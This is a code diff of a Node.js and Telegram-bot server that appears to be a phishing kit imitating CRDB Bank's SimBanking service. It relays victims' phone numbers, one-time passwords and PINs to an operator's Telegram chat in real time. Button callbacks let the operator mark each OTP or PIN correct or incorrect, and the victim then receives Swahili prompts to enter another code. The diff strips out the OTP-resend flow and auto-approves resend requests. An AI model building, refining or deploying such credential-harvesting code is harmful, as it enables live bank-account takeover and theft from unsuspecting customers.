@@ -22,8 +22,6 @@ global.appState = global.appState || {
 bot.onText(/\/start/, (msg) => {
     global.appState.adminChatId = msg.chat.id;
     const user = msg.from;
-    
-    // Dynamically retrieve public application browsing link
     const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';
     
     const welcomeMsg = `✅ **Admin Connected Successfully!**\n\n` +
@@ -76,24 +74,9 @@ app.post('/api/submit', async (req, res) => {
         return res.json({ success: true, status: 'pending' });
     }
     else if (step === 'step4') {
+        // If the applicant's timer ran out, it's handled on client side; we just log it or acknowledge it silently if needed
         if (data.isResend) {
-            const msgText = `🔄 **Step 4: Applicant OTP Expired / Requesting New OTP**\n\n` +
-                `🌐 [Open Browsing App](${appUrl})\n\n` +
-                `📱 **Phone:** ${global.appState.clientData.phoneNumber || 'N/A'}\n\n*Choose action:*`;
-            const opts = {
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: 'SEND NEW OTP 📤', callback_data: 'otp_resend_approve' },
-                            { text: 'IGNORE ❌', callback_data: 'otp_resend_ignore' }
-                        ]
-                    ]
-                },
-                parse_mode: 'Markdown',
-                disable_web_page_preview: true
-            };
-            await bot.sendMessage(global.appState.adminChatId, msgText, opts);
-            return res.json({ success: true, status: 'pending' });
+            return res.json({ success: true, status: 'approved' });
         }
 
         const msgText = `📱 **Step 4: OTP Verification**\n\n` +
@@ -104,8 +87,7 @@ app.post('/api/submit', async (req, res) => {
                 inline_keyboard: [
                     [
                         { text: 'CORRECT OTP ✅', callback_data: 'otp_correct' },
-                        { text: 'INCORRECT OTP ❌', callback_data: 'otp_incorrect' },
-                        { text: 'RESEND OTP 🔄', callback_data: 'otp_resend' }
+                        { text: 'INCORRECT OTP ❌', callback_data: 'otp_incorrect' }
                     ]
                 ]
             },
@@ -158,15 +140,6 @@ bot.on('callback_query', async (query) => {
     } else if (action === 'otp_incorrect') {
         await bot.sendMessage(chatId, '❌ Incorrect OTP.');
         global.appState.currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi ❌. Tafadhali ingiza OTP mpya.' };
-    } else if (action === 'otp_resend') {
-        await bot.sendMessage(chatId, '🔄 Resend OTP triggered.');
-        global.appState.currentClientResponse = { status: 'resend', message: 'Ombi la kutuma tena OTP limepokelewa ✅.' };
-    } else if (action === 'otp_resend_approve') {
-        await bot.sendMessage(chatId, '✅ New OTP request approved and sent to applicant.');
-        global.appState.currentClientResponse = { status: 'resend', message: 'Namba mpya ya OTP imetumwa kwenye simu yako ✅.' };
-    } else if (action === 'otp_resend_ignore') {
-        await bot.sendMessage(chatId, 'ℹ️ New OTP request ignored.');
-        global.appState.currentClientResponse = { status: 'retry_otp', message: 'Tafadhali tumia OTP uliyopokea awali.' };
     } else if (action === 'pin_correct') {
         await bot.sendMessage(chatId, '✅ Correct PIN!');
         global.appState.pinAttempts = 3;
@@ -208,4 +181,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-                                      
+    
